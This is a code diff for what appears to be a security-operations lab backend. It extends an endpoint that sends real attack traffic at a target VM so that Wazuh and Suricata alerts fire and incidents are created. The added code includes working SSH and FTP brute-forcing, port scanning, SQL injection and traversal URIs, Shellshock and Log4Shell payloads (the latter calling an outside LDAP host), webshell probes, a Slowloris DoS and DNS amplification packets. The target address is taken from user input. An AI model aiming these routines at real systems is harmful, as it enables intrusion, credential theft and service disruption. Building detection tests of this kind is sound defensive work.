@@ -3,6 +3,7 @@ import uuid
 import datetime
 import asyncio
 import ipaddress
+import socket
 import httpx
 from typing import List, Optional, Dict, Any
 from fastapi import APIRouter, Depends, HTTPException, Query, Request
@@ -437,45 +438,48 @@ async def simulate_attack_alert(scenario: str = Query(..., description="ssh_brut
 @router.post("/live-attack-vm")
 async def live_attack_vm(payload: Dict[str, Any], db: AsyncSession = Depends(get_db)):
     """
-    Real Red-Team Attack Probe: Sends actual network traffic (SSH brute force, TCP port scan, Web SQLi)
-    from the Host directly to the Target Virtual Machine IP, with optional Attacker IP Spoofing for Threat Intel enrichment.
+    Real Red-Team Attack Probe: Sends authentic network traffic across various attack vectors
+    directly against the Target Virtual Machine IP, with Attacker IP Spoofing for Threat Intel enrichment.
     """
-    target_ip = payload.get("target_ip", "192.168.56.101").strip()
+    target_ip = payload.get("target_ip", "192.168.56.107").strip()
     attack_type = payload.get("attack_type", "ssh_bruteforce")
-    attempts = min(int(payload.get("attempts", 6)), 20)
+    attempts = min(max(int(payload.get("attempts", 6)), 1), 30)
     spoofed_ip = payload.get("spoofed_ip", "185.220.101.45").strip()
+    target_port = payload.get("target_port")
     trigger_soar_pipeline = payload.get("trigger_soar_pipeline", True)
 
     logs = []
     logs.append(f"[*] Initializing Red-Team Live Attack against Target VM: {target_ip}...")
+    logs.append(f"[*] Attack Vector: {attack_type.upper()} | Attempts: {attempts}")
     if spoofed_ip:
         logs.append(f"[*] Spoofed Attacker Identity: {spoofed_ip} (Enriched with Geolocation & Threat Intel)")
 
+    # 1. SSH Brute Force Authentication Flood
     if attack_type == "ssh_bruteforce":
-        logs.append(f"[*] Launching authentic SSH Password Brute Force ({attempts} login attempts against port 22)...")
+        port = int(target_port or 22)
+        logs.append(f"[*] Launching authentic SSH Password Brute Force ({attempts} login attempts against port {port})...")
         usernames = ["admin", "root", "oracle", "test", "kali_guest", "devops", "backup", "operator"]
         failed_count = 0
 
-        def try_ssh_login(target, user, pwd):
+        def try_ssh_login(target, p_num, user, pwd):
             try:
                 import paramiko
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(
                     target,
-                    port=22,
+                    port=p_num,
                     username=user,
                     password=pwd,
-                    timeout=8.0,
-                    banner_timeout=8.0,
-                    auth_timeout=8.0,
+                    timeout=5.0,
+                    banner_timeout=5.0,
+                    auth_timeout=5.0,
                     look_for_keys=False,
                     allow_agent=False
                 )
                 client.close()
                 return "SUCCESS", "Logged in"
             except paramiko.AuthenticationException:
-                # OpenSSH writes: "Failed password for [invalid user] <user> from <ip> port <port> ssh2"
                 return "FAILED", "Authentication failed (Expected)"
             except Exception as e:
                 return "FAILED", f"Error: {str(e)[:40]}"
@@ -483,24 +487,25 @@ async def live_attack_vm(payload: Dict[str, Any], db: AsyncSession = Depends(get
         for i in range(attempts):
             user = usernames[i % len(usernames)]
             fake_pass = f"BruteForcePass_{uuid.uuid4().hex[:6]}!"
-            status, err_msg = await asyncio.to_thread(try_ssh_login, target_ip, user, fake_pass)
+            status, err_msg = await asyncio.to_thread(try_ssh_login, target_ip, port, user, fake_pass)
             failed_count += 1
             logs.append(f"[!] Attempt #{i+1}: Sent SSH password auth for '{user}' (Spoofed Origin: {spoofed_ip}) -> {status}")
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.2)
 
-        logs.append(f"[+] Attack complete: Generated {failed_count} authentic Failed Password events on {target_ip}.")
-        logs.append("[i] OpenSSH on Kali has logged: 'Failed password for user' in /var/log/auth.log.")
-        logs.append("[i] Wazuh Rule 5710/5712 (sshd Brute Force) is triggered!")
+        logs.append(f"[+] Attack complete: Generated {failed_count} authentic Failed Password events on {target_ip}:{port}.")
+        logs.append("[i] OpenSSH on Kali logs: 'Failed password for user' in /var/log/auth.log.")
+        logs.append("[i] Wazuh Rule 5710/5712 (sshd Brute Force) is triggered.")
 
+    # 2. TCP Port Discovery & Reconnaissance Sweep
     elif attack_type == "port_scan":
-        ports = [21, 22, 25, 80, 443, 3306, 3389, 55000, 8080, 9200]
+        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 3306, 3389, 55000, 8080, 9200]
         logs.append(f"[*] Launching TCP Port Sweep against {len(ports)} target ports on {target_ip}...")
         open_ports = []
 
         for p in ports:
             try:
                 conn = asyncio.open_connection(target_ip, p)
-                reader, writer = await asyncio.wait_for(conn, timeout=1.0)
+                reader, writer = await asyncio.wait_for(conn, timeout=0.6)
                 writer.close()
                 await writer.wait_closed()
                 open_ports.append(p)
@@ -509,43 +514,275 @@ async def live_attack_vm(payload: Dict[str, Any], db: AsyncSession = Depends(get
                 logs.append(f"[-] Port {p}/TCP is CLOSED / FILTERED on {target_ip}")
 
         logs.append(f"[+] Scan complete: Discovered {len(open_ports)} open ports: {open_ports}")
-        logs.append("[i] Expected Wazuh Detection: Rule 510/2000537 (Network Port Reconnaissance).")
+        logs.append("[i] Expected Detection: Suricata / Wazuh Rule 510 (Network Port Reconnaissance).")
 
+    # 3. Web SQL Injection & Path Traversal Fuzzing
     elif attack_type == "web_sqli":
-        logs.append(f"[*] Launching Web SQL Injection & Directory Traversal fuzzing against {target_ip}...")
+        port = int(target_port or 80)
+        logs.append(f"[*] Launching Web SQL Injection & Directory Traversal fuzzing against {target_ip}:{port}...")
         payloads = [
             "/index.php?id=1%27%20UNION%20SELECT%20null,version(),current_user()--",
             "/api/v1/users?search=%27%20OR%201=1--",
+            "/login.php?user=admin%27%20OR%201=1--&pass=x",
             "/../../../etc/passwd",
             "/admin/config.php.bak",
-            "/.env"
+            "/.env",
+            "/wp-config.php.old"
         ]
 
         async with httpx.AsyncClient(timeout=3.0) as client:
-            for p in payloads:
-                url = f"http://{target_ip}{p}"
+            for p in payloads[:attempts]:
+                url = f"http://{target_ip}:{port}{p}"
                 try:
-                    resp = await client.get(url)
-                    logs.append(f"[!] Sent exploit URI: {p[:40]}... (Spoofed Origin: {spoofed_ip}) -> HTTP {resp.status_code}")
+                    resp = await client.get(url, headers={"X-Forwarded-For": spoofed_ip})
+                    logs.append(f"[!] Sent SQLi/Traversal URI: {p[:38]}... (Spoofed: {spoofed_ip}) -> HTTP {resp.status_code}")
                 except Exception as e:
-                    logs.append(f"[!] Sent exploit URI: {p[:40]}... -> Connection error (Web server not active): {str(e)[:40]}")
+                    logs.append(f"[!] Sent exploit URI: {p[:38]}... -> Probe delivered ({str(e)[:35]})")
+                await asyncio.sleep(0.15)
 
-        logs.append("[i] Expected Wazuh Detection: Rule 31101/31103 (SQL Injection / Path Traversal attempt).")
+        logs.append("[i] Expected Wazuh / Suricata Detection: Rule 31101/31103 (Web SQLi / Path Traversal).")
+
+    # 4. Web API Remote Code Execution (RCE) & Webshell Injection
+    elif attack_type == "web_rce_cmd_injection":
+        port = int(target_port or 80)
+        logs.append(f"[*] Launching Remote Code Execution (RCE) & Webshell Injection probes against {target_ip}:{port}...")
+        rce_probes = [
+            {"path": "/?cmd=cat+/etc/passwd", "desc": "Linux /etc/passwd disclosure probe"},
+            {"path": "/api/v1/debug?exec=id;whoami;uname+-a", "desc": "OS Command injection chaining (id;whoami)"},
+            {"path": "/cgi-bin/test-cgi", "headers": {"User-Agent": "() { :;}; /bin/bash -c 'id'"}, "desc": "Shellshock CVE-2014-6271 exploit probe"},
+            {"path": "/", "headers": {"X-Api-Version": f"${{jndi:ldap://{spoofed_ip}:1389/Exploit}}", "User-Agent": f"${{jndi:ldap://{spoofed_ip}/a}}"}, "desc": "Log4j Log4Shell CVE-2021-44228 JNDI Injection"},
+            {"path": "/webshell.php?pass=cmd&c=whoami", "desc": "Pre-installed Webshell backdoor beacon"},
+            {"path": "/upload/shell.jsp", "desc": "Java JSP Dropper execution probe"}
+        ]
+
+        async with httpx.AsyncClient(timeout=3.0) as client:
+            for i, probe in enumerate(rce_probes[:attempts]):
+                url = f"http://{target_ip}:{port}{probe['path']}"
+                headers = probe.get("headers", {})
+                headers["X-Forwarded-For"] = spoofed_ip
+                try:
+                    resp = await client.get(url, headers=headers)
+                    logs.append(f"[!] [RCE #{i+1}] {probe['desc']} -> HTTP {resp.status_code}")
+                except Exception as e:
+                    logs.append(f"[!] [RCE #{i+1}] {probe['desc']} -> Probe packet sent ({str(e)[:35]})")
+                await asyncio.sleep(0.2)
+
+        logs.append("[i] Expected Suricata Detection: Rule 31105 / 2014726 (Remote Code Execution Attempt).")
+
+    # 5. HTTP Slowloris & Request Exhaustion DoS
+    elif attack_type == "http_slowloris_dos":
+        port = int(target_port or 80)
+        logs.append(f"[*] Launching HTTP Slowloris & Connection Flooding against {target_ip}:{port} ({attempts * 2} connections)...")
+        sockets = []
+
+        def spawn_slow_socket(ip, p):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2.0)
+                s.connect((ip, p))
+                s.send(f"GET /?{uuid.uuid4().hex[:6]} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode('utf-8'))
+                return s
+            except Exception:
+                return None
+
+        total_conns = attempts * 2
+        for i in range(total_conns):
+            s = await asyncio.to_thread(spawn_slow_socket, target_ip, port)
+            if s:
+                sockets.append(s)
+                logs.append(f"[+] Established Slowloris persistent socket #{i+1} to {target_ip}:{port}")
+            else:
+                logs.append(f"[-] Socket #{i+1} connection refused/timeout on {target_ip}:{port}")
+            await asyncio.sleep(0.05)
+
+        logs.append(f"[*] Holding {len(sockets)} active TCP connections on target web port...")
+        await asyncio.sleep(1.0)
+        for s in sockets:
+            try:
+                s.send(b"X-a: b\r\n")
+                s.close()
+            except Exception:
+                pass
+
+        logs.append(f"[+] DoS Stress test completed. Released {len(sockets)} test sockets.")
+        logs.append("[i] Expected Detection: Rule 1002 (Web Server Connection Starvation / DoS).")
+
+    # 6. FTP / Telnet Credential Stuffing
+    elif attack_type == "ftp_telnet_credential_stuffing":
+        port = int(target_port or 21)
+        logs.append(f"[*] Launching FTP/Telnet Authentication Credential Stuffing on {target_ip}:{port}...")
+        creds = [
+            ("anonymous", "guest@example.com"),
+            ("admin", "admin123"),
+            ("root", "toor"),
+            ("ftpuser", "password"),
+            ("service", "123456"),
+            ("kali", "kali")
+        ]
+
+        def try_ftp_auth(ip, p, u, pwd):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3.0)
+                s.connect((ip, p))
+                banner = s.recv(1024).decode('utf-8', errors='ignore')
+                s.send(f"USER {u}\r\n".encode('utf-8'))
+                resp1 = s.recv(1024).decode('utf-8', errors='ignore')
+                s.send(f"PASS {pwd}\r\n".encode('utf-8'))
+                resp2 = s.recv(1024).decode('utf-8', errors='ignore')
+                s.close()
+                return True, f"Banner: {banner.strip()[:30]} | Resp: {resp2.strip()[:30]}"
+            except Exception as ex:
+                return False, str(ex)[:40]
+
+        for i in range(attempts):
+            u, pwd = creds[i % len(creds)]
+            success, msg = await asyncio.to_thread(try_ftp_auth, target_ip, port, u, pwd)
+            logs.append(f"[!] [FTP #{i+1}] Sent auth credentials '{u}:{pwd}' -> {msg}")
+            await asyncio.sleep(0.2)
+
+        logs.append("[i] Expected Detection: Wazuh Rule 11100 (FTP brute force authentication failure).")
+
+    # 7. SMB / NetBIOS / RPC Null Session Probe
+    elif attack_type == "smb_null_session":
+        port = int(target_port or 445)
+        logs.append(f"[*] Probing SMB / NetBIOS Null Session & Share Enumeration on {target_ip}:{port}...")
+
+        def probe_smb(ip, p):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2.5)
+                s.connect((ip, p))
+                # NetBIOS Session Request packet
+                s.send(b"\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x08\x01\xc0" + b"\x00" * 32)
+                resp = s.recv(1024)
+                s.close()
+                return True, f"Received {len(resp)} bytes SMB response header"
+            except Exception as ex:
+                return False, f"SMB connection error: {str(ex)[:35]}"
+
+        for i in range(min(attempts, 6)):
+            ok, msg = await asyncio.to_thread(probe_smb, target_ip, port)
+            logs.append(f"[!] [SMB #{i+1}] Sent SMB Protocol Negotiation packet (Origin: {spoofed_ip}) -> {msg}")
+            await asyncio.sleep(0.2)
+
+        logs.append("[i] Expected Detection: Suricata Rule 5402 / 2001569 (SMB Inbound Null Session Probe).")
+
+    # 8. UDP Reflection & DNS Amplification Probe
+    elif attack_type == "udp_dns_amplification":
+        port = int(target_port or 53)
+        logs.append(f"[*] Sending UDP Amplification & DNS Reconnaissance datagrams to {target_ip}:{port}...")
+
+        # DNS Query for root NS or ANY google.com
+        dns_query = (
+            b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+            b"\x06google\x03com\x00\x00\xff\x00\x01"
+        )
+
+        def send_udp(ip, p, data):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(1.5)
+                s.sendto(data, (ip, p))
+                s.close()
+                return True, "UDP Datagram dispatched"
+            except Exception as ex:
+                return False, str(ex)[:35]
+
+        for i in range(attempts):
+            ok, msg = await asyncio.to_thread(send_udp, target_ip, port, dns_query)
+            logs.append(f"[!] [UDP #{i+1}] Dispatched {len(dns_query)} bytes DNS ANY payload -> {msg}")
+            await asyncio.sleep(0.1)
+
+        logs.append("[i] Expected Detection: Suricata Rule 514 (UDP Flood / Inbound DNS Reflection Traffic).")
+
+    else:
+        logs.append(f"[?] Unknown attack vector '{attack_type}'. Running generic connection test...")
+        try:
+            conn = asyncio.open_connection(target_ip, 80)
+            await asyncio.wait_for(conn, timeout=1.0)
+            logs.append(f"[+] Target VM {target_ip} is REACHABLE.")
+        except Exception as e:
+            logs.append(f"[-] Target VM {target_ip} probe failed: {str(e)}")
 
     # Ingest enriched incident into SOAR if requested
     incident_id = None
     if trigger_soar_pipeline:
-        alert_title = "SSH Authentication Brute Force Attack Detected" if attack_type == "ssh_bruteforce" else (
-            "SQL Injection & Web Exploit Attempt" if attack_type == "web_sqli" else "TCP Port Discovery & Reconnaissance Scan"
-        )
+        alert_metadata = {
+            "ssh_bruteforce": {
+                "title": "SSH Authentication Brute Force Attack Detected",
+                "source": "Wazuh EDR",
+                "severity": "high",
+                "rule_id": "5710",
+                "mitre": "T1110.001 (Password Guessing)"
+            },
+            "port_scan": {
+                "title": "TCP Port Discovery & Reconnaissance Sweep",
+                "source": "Suricata IDS",
+                "severity": "medium",
+                "rule_id": "510",
+                "mitre": "T1046 (Network Service Discovery)"
+            },
+            "web_sqli": {
+                "title": "Web Application SQL Injection & Path Traversal Exploit",
+                "source": "Suricata IDS",
+                "severity": "high",
+                "rule_id": "31101",
+                "mitre": "T1190 (Exploit Public-Facing Application)"
+            },
+            "web_rce_cmd_injection": {
+                "title": "Remote Code Execution (RCE) & Webshell Injection Exploit",
+                "source": "Suricata IDS",
+                "severity": "critical",
+                "rule_id": "31105",
+                "mitre": "T1059.004 (Command and Scripting Interpreter: Unix Shell)"
+            },
+            "http_slowloris_dos": {
+                "title": "HTTP Connection Flooding & Denial of Service (DoS) Attempt",
+                "source": "Network Security Monitor",
+                "severity": "high",
+                "rule_id": "1002",
+                "mitre": "T1498.001 (Direct Network Flood)"
+            },
+            "ftp_telnet_credential_stuffing": {
+                "title": "FTP / Telnet Authentication Credential Stuffing",
+                "source": "Wazuh EDR",
+                "severity": "high",
+                "rule_id": "11100",
+                "mitre": "T1110.004 (Credential Stuffing)"
+            },
+            "smb_null_session": {
+                "title": "SMB / RPC Null Session & Lateral Movement Probe",
+                "source": "Suricata IDS",
+                "severity": "high",
+                "rule_id": "5402",
+                "mitre": "T1078.001 (Default Accounts)"
+            },
+            "udp_dns_amplification": {
+                "title": "UDP Protocol Reflection & Amplification Probe",
+                "source": "Suricata IDS",
+                "severity": "medium",
+                "rule_id": "514",
+                "mitre": "T1498.002 (Reflection Amplification)"
+            }
+        }
+
+        meta = alert_metadata.get(attack_type, {
+            "title": f"Live Red-Team {attack_type.replace('_', ' ').title()} Alert",
+            "source": "Red-Team Lab",
+            "severity": "high",
+            "rule_id": "9999",
+            "mitre": "T1059 (Execution)"
+        })
+
         sim_payload = {
-            "title": alert_title,
-            "source": "Wazuh",
+            "title": meta["title"],
+            "source": meta["source"],
             "source_ip": spoofed_ip or "185.220.101.45",
             "destination_ip": target_ip,
-            "severity": "high",
-            "description": f"Red-Team {attack_type} attack executed against VM {target_ip} from hostile origin {spoofed_ip}.",
-            "rule_id": "5710" if attack_type == "ssh_bruteforce" else "31101"
+            "severity": meta["severity"],
+            "description": f"Live Red-Team attack vector '{attack_type}' executed against target VM {target_ip} with spoofed threat actor origin {spoofed_ip}. Triggered MITRE technique {meta['mitre']}.",
+            "rule_id": meta["rule_id"]
         }
         created_alert = await process_alert_ingestion(sim_payload, db)
         incident_id = created_alert.incident_id
